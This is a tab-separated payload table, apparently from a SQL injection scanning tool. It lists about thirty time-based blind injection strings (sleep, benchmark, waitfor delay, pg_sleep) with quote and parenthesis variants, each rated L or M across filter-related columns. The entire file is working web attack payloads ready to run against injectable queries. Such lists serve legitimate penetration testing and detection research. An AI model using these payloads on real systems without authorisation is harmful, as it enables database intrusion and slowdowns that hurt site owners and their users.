sqli	d_char	d_token	punck	s_token	space	length	alw_true	output
sleep(__time__)#	L	L	L	L	L	L	L	L
1 or sleep(__time__)#	L	L	L	L	L	L	L	L
" or sleep(__time__)#	L	L	L	L	L	L	L	L
' or sleep(__time__)#	L	L	L	L	L	L	L	L
" or sleep(__time__)="	L	L	L	L	L	L	L	L
' or sleep(__time__)='	M	L	L	L	L	L	L	L-M
1) or sleep(__time__)#	L	L	L	L	L	L	L	L
") or sleep(__time__)="	L	L	L	L	L	L	L	L
') or sleep(__time__)='	M	L	L	L	L	L	L	L-M
1)) or sleep(__time__)#	L	L	L	L	L	L	L	L
")) or sleep(__time__)="	L	L	L	L	L	L	L	L
')) or sleep(__time__)='	M	L	L	L	L	L	L	L-M
;waitfor delay '0:0:__time__'--	M	L	L	L	L	L	L	L-M
);waitfor delay '0:0:__time__'--	M	L	L	L	L	L	L	L-M
';waitfor delay '0:0:__time__'--	M	L	L	L	L	L	L	L-M
";waitfor delay '0:0:__time__'--	M	L	L	L	L	L	L	L-M
');waitfor delay '0:0:__time__'--	M	L	L	L	L	L	L	L-M
");waitfor delay '0:0:__time__'--	M	L	L	L	L	L	L	L-M
));waitfor delay '0:0:__time__'--	M	L	L	L	L	L	L	L-M
'));waitfor delay '0:0:__time__'--	M	L	L	L	L	L	L	L-M
"));waitfor delay '0:0:__time__'--	M	L	L	L	L	L	L	L-M
benchmark(10000000,md5(1))#	L	L	L	L	L	L	L	L
1 or benchmark(10000000,md5(1))#	L	L	L	L	L	L	L	L
" or benchmark(10000000,md5(1))#	L	L	L	L	L	L	L	L
' or benchmark(10000000,md5(1))#	L	L	L	L	L	L	L	L
1) or benchmark(10000000,md5(1))#	L	L	L	L	L	L	L	L
") or benchmark(10000000,md5(1))#	L	L	L	L	L	L	L	L
') or benchmark(10000000,md5(1))#	L	L	L	L	L	L	L	L
1)) or benchmark(10000000,md5(1))#	L	L	L	L	L	L	L	L
")) or benchmark(10000000,md5(1))#	L	L	L	L	L	L	L	L
')) or benchmark(10000000,md5(1))#	L	L	L	L	L	L	L	L
pg_sleep(__time__)--	L	L	L	L	L	L	L	L
1 or pg_sleep(__time__)--	L	L	L	L	L	L	L	L
